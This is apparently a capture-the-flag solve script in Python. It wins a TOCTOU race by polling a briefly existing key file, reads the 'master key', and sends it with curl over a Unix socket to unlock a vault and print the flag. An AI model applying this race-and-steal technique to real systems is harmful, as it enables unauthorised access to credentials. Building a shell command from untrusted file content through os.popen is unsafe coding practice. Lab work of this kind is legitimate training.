import os
import time
import json
import sys

# --- ANSI Color Codes ---
GREEN = "\033[92m"
CYAN = "\033[96m"
YELLOW = "\033[93m"
RED = "\033[91m"
BOLD = "\033[1m"
RESET = "\033[0m"

def typewriter(text, delay=0.03):
    """Prints text with a retro typewriter animation."""
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print()

def print_banner(flag):
    """Renders a high-tech victory animation in the terminal."""
    print("\n" + "=" * 60)
    
    # Glitch / Loading animation
    spinner = ["|", "/", "-", "\\"]
    for i in range(12):
        sys.stdout.write(f"\r{YELLOW}[*] DECRYPTING VAULT C PAYLOAD... {spinner[i % 4]}{RESET}")
        sys.stdout.flush()
        time.sleep(0.1)
    
    print(f"\r{GREEN}[+] ACCESS GRANTED! VAULT C BREACHED SUCCESSFULLY!{RESET}       \n")
    time.sleep(0.3)

    # ASCII Flag Banner
    flag_art = f"""{GREEN}{BOLD}
    ===================================================
      _____  _       _    ____   ____ _____ _____ ____  
     |  ___|| |     / \  / ___| |  _ \ ____|  ___/ ___| 
     | |_   | |    / _ \| |  _  | |_) |  _| | |_ \___ \ 
     |  _|  | |___/ ___ \ |_| | |  _ <| |___|  _| ___) |
     |_|    |_____/_/   \_\____| |_| \_\_____|_|  |____/ 
                                                        
    ==================================================={RESET}
    """
    print(flag_art)
    
    typewriter(f"{CYAN}{BOLD}[>] SYSTEM STATUS :{RESET} {GREEN}UNLOCKED{RESET}")
    typewriter(f"{CYAN}{BOLD}[>] EXPLOIT TYPE  :{RESET} {YELLOW}TOCTOU Race Condition (Unix Socket){RESET}")
    time.sleep(0.2)
    print("-" * 60)
    typewriter(f"{YELLOW}{BOLD}[!] YOUR FLAG     :{RESET} {GREEN}{BOLD}{flag}{RESET}", delay=0.04)
    print("=" * 60 + "\n")

# --- Exploitation Logic ---
target_file = '/auth_sync/.vault_c_dynamic.key'
print(f"{CYAN}[*] Hunting the ghost... monitoring {target_file} for the 1.5s window.{RESET}")

while True:
    if os.path.exists(target_file):
        try:
            with open(target_file, 'r') as f:
                key = f.read().strip()
            
            if key:
                print(f"{GREEN}[!] CAUGHT IT! Stolen Master Key: {key}{RESET}")
                print(f"{CYAN}[*] Injecting key into Unix socket /tmp_sock/.sys.sock...{RESET}")
                
                # Execute payload and capture raw JSON response silently
                cmd = f'curl -s -X POST --unix-socket /tmp_sock/.sys.sock http://localhost/api/vault/unlock -d auth={key}'
                raw_response = os.popen(cmd).read()
                
                try:
                    data = json.loads(raw_response)
                    if "flag" in data:
                        print_banner(data["flag"])
                        break
                    else:
                        print(f"{RED}[-] Server returned error: {data.get('error')}{RESET}")
                        break
                except json.JSONDecodeError:
                    print(f"{RED}[-] Raw response: {raw_response}{RESET}")
                    break
        except Exception:
            # If we try to read while the bot is deleting it, ignore and retry
            pass
            
    # Small sleep to prevent CPU spiking while looping
    time.sleep(0.01)
